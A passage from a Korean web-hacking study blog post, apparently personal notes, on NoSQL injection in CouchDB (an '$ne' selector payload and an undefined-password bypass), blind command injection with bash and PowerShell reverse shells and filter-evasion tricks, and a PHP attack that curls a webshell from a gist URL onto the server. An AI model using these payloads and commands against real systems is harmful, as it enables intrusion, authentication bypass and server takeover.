정보</p></li><li><p>postgreSQL 의 <code>information_schema.columns</code> : DB, 테이블, 컬럼 정보</p></li><li><p>oracle의 <code>all_tables</code> : 사용자가 접근 가능한 테이블 정보</p></li><li><p>oracle의 <code>all_tab_columns</code> : 사용자가 접근 가능한 테이블 정보</p></li><li><p>oracle의 <code>all_users</code> : 계정 정보</p></li><li><p>SQLite의 <code>sqlite_master</code> : 시스템 정보가 포함된 테이블</p></li></ul><h2 id=couch-db-exploiting>Couch DB exploiting<a hidden class=anchor aria-hidden=true href=#couch-db-exploiting>#</a></h2><ul><li>CouchDB 는 HTTP 통신을 통해 원격으로 데이터를 저장, 조회 가능하도록 인터페이스가 구현되어 있다.<ul><li><code>/_all_dbs</code> : 모든 데이터베이스 목록 반환</li><li><code>_utils</code> : 관리자 페이지</li><li><code>/{DB이름}/_all_docs</code> : DB 안에 포함된 모든 항목 반환</li><li><code>/{DB이름}/_finds</code> : JSON 쿼리에 매칭되는 모든 항목 반환</li></ul></li></ul><ol><li><code>/DB이름/_alldocs</code> 로 접근을 차단하지 않았다면 해당 url에서 DB 정보를 획득할 수 있다.</li><li>couch DB는 noSQL 이고, object 형태의 쿼리를 <code>/{DB이름}/_finds</code> url에 넣어 동작시킨다. 하지만 쿼리에 연산자가 포함되었는지 점금하지 않는다면 sql injection 공격이 가능하다.<ul><li>정상 : <code>{'selector': {'key': 'name', 'value': 'admin'}</code></li><li>공격쿼리 : <code>{'selector': {'key': 'name', 'value': {'$ne':''}}</code></li></ul></li><li>쿼리에 해당하는 값이 없을 떄 반환값은 <code>undefined</code> 이다. 이를 이용해 비교구문을 회피할 수 있다.<ul><li><code>if (result.pswd === req.body.pswd)</code> 구문에서 req.body.pswd = undefined 로 세팅하고, 쿼리 결과 result에 pswd 필드가 없다면 result.pswd = undefined 가 된다.</li><li><code>/{DB이름}/_all_docs</code> 으로 쿼리를 요청하면 쿼리 결과는 성공적으로 받아올 수 있지만 result에는 pswd 필드가 없어 exploit을 하기 적합하다.<ul><li>ex) <code>{"key": "_all_docs"}</code></li></ul></li></ul></li></ol><h2 id=command-injection-linux>Command Injection (Linux)<a hidden class=anchor aria-hidden=true href=#command-injection-linux>#</a></h2><ul><li><p>원격으로 쉘에 명령을 주입한 후 실행 결과를 확인할 수 없는 상황 일때 사용 가능한 방법은 다음과 같다.</p><ul><li>network outbound : 네트워크 도구를 서버에 설치하여 명령어 실행 결과를 전송하는 것<ul><li>쉘 명령어의 파이프를 통해 명령어 실행 결과를 네트워크로 출력</li><li>ne, telnet, wget, curl 등을 네트워크 파일이나 /dev/tcp, /dev/udp 등의 bash 기능을 사용 가능</li></ul></li><li>reverse shell : 공격 대상자의 시스템을 대상으로 shell 을 서비스 하는 것<ul><li>ex) 타깃 시스템에 <code>/bin/sh -i >& /dev/tcp/127.0.0.1/8080 0>&amp;1</code> 명령어 실행 후 8080포트로 연결 시도</li></ul></li><li>bind shell : 특정 포트로 shell 을 서비스 하는 것</li><li>파일 : 특정 경로에 실행 결과를 파일로 남긴는 것</li></ul></li><li><p>보호기법 회피 방법</p><ul><li>IP주소를 long 형태로 세팅할 수 도 있다. (ex: 3232235521 = 192.168.0.1)</li><li>와일드카드로 문자열 필터링을 회피할 수 있다. (ex: /bin/ls = /bin/?s)</li><li>ascii를 hex 데이터로 치환할 수 있다. (ex: id = \x69\x64, password=70617373776F7264)</li></ul><h2 id=command-injection-window>Command Injection (Window)<a hidden class=anchor aria-hidden=true href=#command-injection-window>#</a></h2><ul><li>윈도우는 리눅스와 메타문자가 다르기 때문에 윈도우 전용 메타문자를 확인하고 사용하여야 한다.<ul><li>ex: <code>$PATH</code> vs <code>%PATH%</code></li></ul></li><li>윈도우는 자체적인 보안 시스템인 윈도우 디펜더가 기본적인 보안을 수행하고 있기 때문에 이를 우회해야 공격이 가능하다.</li><li>윈도우의 리버스 쉘<pre tabindex=0><code>$tcp = New-Object System.Net.Sockets.TCPClient(&#34;IP주소&#34;,포트)
$socket = $tcp.GetStream();
[byte[]]$inputs = 0..65535|%{0};
$encData = ([text.encoding]::ASCII).GetBytes($sendinputs);
$socket.Write($encData,0,$encData.Length);
$socket.Flush()
</code></pre></li></ul></li></ul><h2 id=php-exploit>PHP exploit<a hidden class=anchor aria-hidden=true href=#php-exploit>#</a></h2><ul><li>command injection & file vulnerability 를 이용한 공격이다.</li><li>조건 : php에서 <code>shell_exec</code> 명령어로 shell 명령어를 실행하며, 명령어를 url로 받는 경우<ul><li>curl 명령을 실행시켜 web shell 을 서버에 저장시키고 이를 실행하는 방법으로 권한을 탈취한다. (file vulnerabiltiy)</li><li><code>escapeshellcmd</code> 함수로 공격을 어느정도 방어할 수는 있지만, &lsquo;-&rsquo; 문자열 자체를 필터링 하지는 않기 때문에 file vulnerability를 완전히 막을 수는없다.<ul><li>ex) <code>shell_exec('curl '. escapeshellcmd($input));</code></li></ul></li></ul></li><li>github 의 <a href=https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php>webshell</a> 파일을 <code>curl -o</code> 커맨드로 특정 위치에 다운받도록 한다.<ul><li>ex)<code>curl%20https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php%20-o%20/var/www/html/cache/webshell.php</code></li><li>cache/webshell.php 에 접속하면 주입한 웹쉘을 실행시킬 수 있다.</li></ul></li></ul></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://aswinblue.github.io/Blog/post/databases/database/><span class=title>« Prev</span><br><span>Database</span>
</a><a class=next href=https://aswinblue.github.io/Blog/post/projects/youtube_downloader/><span class=title>Next »</span><br><span>Youtube Downloader</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Exploit on twitter" href="https://twitter.com/intent/tweet/?text=Exploit&amp;url=https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fwebhacking%2fexploit%2f&amp;hashtags="><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a><a target=_blank rel="noopener noreferrer" aria-label="share Exploit on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fwebhacking%2fexploit%2f&amp;title=Exploit&amp;summary=Exploit&amp;source=https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fwebhacking%2fexploit%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a><a target=_blank rel="noopener noreferrer" aria-label="share Exploit on reddit" href="https://reddit.com/submit?url=https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fwebhacking%2fexploit%2f&title=Exploit"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a><a target=_blank rel="noopener noreferrer" aria-label="share Exploit on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fwebhacking%2fexploit%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a><a target=_blank rel="noopener noreferrer" aria-label="share Exploit on whatsapp" href="https://api.whatsapp.com/send?text=Exploit%20-%20https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fwebhacking%2fexploit%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a><a target=_blank rel="noopener noreferrer" aria-label="share Exploit on telegram" href="https://telegram.me/share/url?text=Exploit&amp;url=https%3a%2f%2faswinblue.github.io%2fBlog%2fpost%2fwebhacking%2fexploit%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentColor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><div class=auto-hide-div><ins class=kakao_ad_area style=display:none;position:fixed data-ad-unit=DAN-17Lk24lxFVgxtePU data-ad-width=160 data-ad-height=auto></ins></div><script type=text/javascript src=//t1.daumcdn.net/kas/static/ba.min.js async></script></div><footer class=footer><span>&copy; 2025 <a href=https://aswinblue.github.io/Blog/>AswinBlue</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>